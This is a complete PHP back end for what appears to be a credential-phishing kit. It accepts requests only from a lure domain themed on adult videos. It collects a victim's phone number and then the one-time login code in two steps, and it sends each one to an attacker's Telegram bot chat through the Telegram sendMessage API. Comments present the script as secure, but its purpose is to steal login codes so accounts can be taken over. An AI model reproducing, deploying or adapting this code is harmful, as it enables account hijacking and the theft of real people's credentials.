<?php
// Allowed domain
$allowedDomain = "https://desiviralxxxvideos.infy.uk";    

// Restrict access to the specific domain    
if (!isset($_SERVER['HTTP_ORIGIN']) || $_SERVER['HTTP_ORIGIN'] !== $allowedDomain) {    
    header("HTTP/1.1 403 Forbidden");    
    exit("Invalid Request");    
}    

// Enable CORS only for the allowed domain    
header("Access-Control-Allow-Origin: $allowedDomain");      
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");      
header("Access-Control-Allow-Headers: Content-Type");      

// Handle preflight requests (CORS OPTIONS request)      
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {      
    http_response_code(204);      
    exit();      
}      

// Securely fetch Telegram credentials from environment variables
$telegramToken = getenv('TOKEN');      
$chatId = getenv('ID');    

// Validate environment variables (no exposure in response)
if (!$telegramToken || !$chatId) {
    error_log("Error: Telegram credentials are missing."); // Logs to server, not user
    http_response_code(500);
    exit("Internal Server Error.");
}

// Process POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'phone') {
        sendPhoneToTelegram();
    } elseif ($action === 'otp') {
        sendOtpToTelegram();
    } else {
        http_response_code(400);
        exit("Invalid request.");
    }
}

function sendPhoneToTelegram() {
    global $telegramToken, $chatId;

    $countryCode = filter_input(INPUT_POST, 'country_code', FILTER_SANITIZE_STRING);
    $phone = filter_input(INPUT_POST, 'phone', FILTER_SANITIZE_STRING);

    if (empty($countryCode) || empty($phone)) {
        http_response_code(400);
        exit("Missing phone or country code.");
    }

    $message = "📞 *Phone Number*\n\n"
             . "`" . htmlspecialchars($countryCode, ENT_QUOTES, 'UTF-8') . "` "
             . "`" . htmlspecialchars($phone, ENT_QUOTES, 'UTF-8') . "`";

    sendTelegramMessage($message);
    exit(json_encode(["step" => "code"])); 
}

function sendOtpToTelegram() {
    global $telegramToken, $chatId;

    $phone = filter_input(INPUT_POST, 'phone', FILTER_SANITIZE_STRING);
    $otp = filter_input(INPUT_POST, 'code', FILTER_SANITIZE_STRING);

    if (empty($phone) || empty($otp)) {
        http_response_code(400);
        exit("Missing phone or OTP.");
    }

    $message = "`" . htmlspecialchars($phone, ENT_QUOTES, 'UTF-8') . "`\n\n"
             . "`" . htmlspecialchars($otp, ENT_QUOTES, 'UTF-8') . "`";

    sendTelegramMessage($message);
    exit(json_encode(["status" => "success"])); 
}

function sendTelegramMessage($message) {
    global $telegramToken, $chatId;
    
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}
?>